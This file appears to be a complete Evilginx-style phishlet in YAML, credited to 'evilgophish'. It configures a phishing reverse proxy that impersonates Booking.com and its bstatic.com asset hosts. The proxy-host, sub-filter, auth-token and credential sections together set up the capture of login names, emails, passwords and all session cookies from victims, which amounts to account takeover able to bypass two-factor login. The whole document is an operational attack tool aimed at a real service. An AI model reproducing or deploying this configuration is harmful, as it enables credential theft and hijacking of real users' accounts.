author: '@Anonymous / evilgophish'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'account', orig_sub: 'account', domain: 'booking.com', session: true, is_landing: true}
  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'booking.com', session: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'booking.com', session: true, is_landing: false}
  - {phish_sub: 'join', orig_sub: 'join', domain: 'booking.com', session: false, is_landing: false}
  - {phish_sub: 'admin', orig_sub: 'admin', domain: 'booking.com', session: false, is_landing: false}
  - {phish_sub: 'xml', orig_sub: 'xml', domain: 'booking.com', session: false, is_landing: false}
  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'booking.com', session: false, is_landing: false}
  - {phish_sub: 'q', orig_sub: 'q-cf', domain: 'bstatic.com', session: false, is_landing: false}
  - {phish_sub: 'r', orig_sub: 'r-cf', domain: 'bstatic.com', session: false, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'bstatic.com', session: false, is_landing: false}
sub_filters:
  - {triggers_on: 'account.booking.com', orig_sub: 'account', domain: 'booking.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'secure.booking.com', orig_sub: 'secure', domain: 'booking.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.booking.com', orig_sub: 'www', domain: 'booking.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'join.booking.com', orig_sub: 'join', domain: 'booking.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'admin.booking.com', orig_sub: 'admin', domain: 'booking.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'bstatic.com', orig_sub: 'q-cf', domain: 'bstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
auth_tokens:
  - domain: '.booking.com'
    keys: ['bkng', '.*,regexp']
  - domain: 'account.booking.com'
    keys: ['.*,regexp']
  - domain: 'secure.booking.com'
    keys: ['.*,regexp']
credentials:
  username:
    key: 'login_name|login|email'
    search: '"login_name":"([^"]*)"'
    type: 'json'
  password:
    key: 'password'
    search: '"password":"([^"]*)"'
    type: 'json'
  custom:
    - key: 'login_name|login|email'
      search: '(.*)'
      type: 'post'
    - key: 'password'
      search: '(.*)'
      type: 'post'
login:
  domain: 'account.booking.com'
  path: '/'